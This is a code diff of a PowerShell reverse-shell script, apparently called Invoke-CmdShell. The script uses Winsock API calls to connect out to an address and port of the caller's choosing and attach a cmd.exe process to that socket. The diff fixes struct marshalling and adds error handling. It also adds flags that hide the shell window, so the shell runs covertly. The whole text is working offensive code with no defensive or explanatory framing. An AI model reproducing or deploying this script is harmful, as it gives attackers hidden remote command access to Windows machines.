@@ -38,8 +38,10 @@ usage:Invoke-CmdShell -c 192.168.1.100 -p 8080
     {
         public Int16 wVestion;
         public Int16 wHighVersion;
-        public Byte szDescription;
-        public Byte szSystemStatus;
+        [MarshalAs(UnmanagedType.ByValTStr,SizeConst = 257)]
+        public string szDescription;
+        [MarshalAs(UnmanagedType.ByValTStr,SizeConst = 129)]
+        public string szSystemStatus;
         public Int16 iMaxSockets;
         public Int16 iMaxUdpDg;
         public IntPtr lpVendorInfo;
@@ -61,8 +63,8 @@ usage:Invoke-CmdShell -c 192.168.1.100 -p 8080
     {
         [DllImport("ws2_32.dll", CharSet = CharSet.Unicode, SetLastError=true)]
 		public static extern int WSAStartup(
-			Int16 wVersionRequested,
-			out WSAData lpWSAData
+			short wVersionRequested,
+			ref WSAData lpWSAData
 		);
 
         [DllImport("ws2_32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
@@ -102,9 +104,12 @@ usage:Invoke-CmdShell -c 192.168.1.100 -p 8080
 			out PROCESS_INFORMATION lpProcessInformation);
 	}
 "@
+    Trap {"Trap Error: $($_.Exception.Message)"; Continue}
     #wsa socket
     $wsa = New-Object WSAData
-    $t=[Ws2_32]::WSAStartup(0x0202, [ref]$wsa)
+    [Ws2_32]::WSAStartup(0x0202, [ref]$wsa) | Out-Null
+
+    #WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP,NULL,(unsigned int)NULL,(unsigned int)NULL);
     $sock = [ws2_32]::WSASocket(2,1,6,0,0,0) 
 
     $remoteaddr=$c.Split(".")
@@ -119,11 +124,11 @@ usage:Invoke-CmdShell -c 192.168.1.100 -p 8080
 
     #WSAConnect connect to socket on specified IP and Port
 	$size = [System.Runtime.InteropServices.Marshal]::SizeOf($sockaddr)
-	[ws2_32]::WSAConnect($sock,[Ref]$sockaddr,$size,0,0,0,0) | Out-Null
+	if ([ws2_32]::WSAConnect($sock,[Ref]$sockaddr,$size,0,0,0,0) -eq -1) {return "Connect error!"}
 
 	# StartupInfo Struct
 	$StartupInfo = New-Object STARTUPINFO
-	$StartupInfo.dwFlags = 0x100 # StartupInfo.dwFlag
+	$StartupInfo.dwFlags = 0x101 # StartupInfo.dwFlag
 	$StartupInfo.wShowWindow = 0 # StartupInfo.ShowWindow
     $StartupInfo.hStdInput = $StartupInfo.hStdOutput = $StartupInfo.hStdError = $sock
 	$StartupInfo.cb = [System.Runtime.InteropServices.Marshal]::SizeOf($StartupInfo) # Struct Size
@@ -135,7 +140,7 @@ usage:Invoke-CmdShell -c 192.168.1.100 -p 8080
 	
 	# Call CreateProcess
     $Binary = "C:\Windows\System32\cmd.exe"
-	[Kernel32]::CreateProcess( $Binary,$null, [IntPtr]::Zero, [IntPtr]::Zero, $true, 0, [IntPtr]::Zero, $GetCurrentPath, [ref] $StartupInfo, [ref] $ProcessInfo) |out-null
+	[Kernel32]::CreateProcess( $Binary,$null, [IntPtr]::Zero, [IntPtr]::Zero, $true, 0x08000000, [IntPtr]::Zero, $GetCurrentPath, [ref] $StartupInfo, [ref] $ProcessInfo) |out-null
 	
 	echo "`nProcess Information:"
 	Get-Process -Id $ProcessInfo.dwProcessId |fl
